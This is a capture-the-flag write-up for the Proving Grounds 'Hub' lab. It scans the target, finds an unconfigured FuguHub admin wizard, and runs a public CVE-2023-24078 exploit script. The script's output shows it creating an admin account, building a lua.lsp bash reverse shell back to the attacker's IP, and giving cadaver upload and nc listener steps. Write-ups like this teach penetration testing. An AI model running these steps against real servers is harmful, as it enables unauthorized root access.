---
layout: default
title: Hub
parent: Proving Grounds Practice - Linux
nav_order: 11
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/hub]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.246.25

22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
8082/tcp open  http     Barracuda Embedded Web Server
|_http-server-header: BarracudaServer.com (Posix)
| http-methods:
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND
, PROPPATCH, LOCK, UNLOCK
|   Server Date: Wed, 29 Nov 2023 04:00:14 GMT
|_  Server Type: BarracudaServer.com (Posix)
|_http-title: Home
9999/tcp open  ssl/http Barracuda Embedded Web Server
| http-methods:
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND
, PROPPATCH, LOCK, UNLOCK
|   Server Date: Wed, 29 Nov 2023 04:00:13 GMT
|_  Server Type: BarracudaServer.com (Posix)
|_http-server-header: BarracudaServer.com (Posix)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration

---

# 8082 | HTTP

The landing page indicates this is the _FuguHub_ website builder and provides a link to the _CMS Admin Page_

There does not appear to be an admin configured yet.

![admin](../../../assets/images/ctfs/proving_grounds/hub/admin.png)

We now have access to the _web-file-server_

![file](../../../assets/images/ctfs/proving_grounds/hub/file.png)

After doing some research on _FugHub_ with the Baracuda Drive, there is an exploit at the following Github repo that we can use to get a root shell.

[CVE-2023-24078 FuguHub/BarracudaDrive Exploit](https://github.com/overgrowncarrot1/CVE-2023-24078)

# Exploitation

---

After downloading the script we just run the following command...

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/hub]
└─$ python exploit.py -l 192.168.45.217 -p 4444 -r 192.168.246.25 -P 8082
Installing necessary tools if not already installed
Colorama installed, not installing
Selenium installed, not installing
 _____ _____  _____    ______ _   _ _____ _   _ _   _ _   _______
|  _  |  __ \/  __ \   |  ___| | | |  __ \ | | | | | | | | | ___ \
| | | | |  \/| /  \/   | |_  | | | | |  \/ | | | |_| | | | | |_/ /
| | | | | __ | |       |  _| | | | | | __| | | |  _  | | | | ___ \
\ \_/ / |_\ \| \__/\   | |   | |_| | |_\ \ |_| | | | | |_| | |_/ /
 \___/ \____/ \____/   \_|    \___/ \____/\___/\_| |_/\___/\____/
Trying to set the following parameters
Email adm1n@localhost.local , username adm1n password P@ssw0rd!
Creating admin user on http://192.168.246.25:8082/Config-Wizard/wizard/SetAdmin.lsp

Logging in to WebFileServer to retrieve cadaver information

Logging in at http://192.168.246.25:8082/rtl/protected/wfslinks.lsp
Making lua.lsp script with bash reverse shell going to 192.168.45.217 on port 4444

<_io.TextIOWrapper name='lua.lsp' mode='w' encoding='UTF-8'>
Copy the URL you see in the popup, this will be known below as <URL>
Run the following commands

cadaver
 open <URL>
 cd ..
 adm1n
 P@ssw0rd!
 put lua.lsp

Open new tab and start listener with nc -lvnp 4444 press enter to continue

```

After opening a window to connect to the WebDav server with _cadaver_ we can upload the _lua.lsp_ exploit generated by the Python script.

![exploit](../../../assets/images/ctfs/proving_grounds/hub/exploit.png)

# Post-Exploitation

---

No post-exploitation required as we have a root exploit from the initial exploitation.
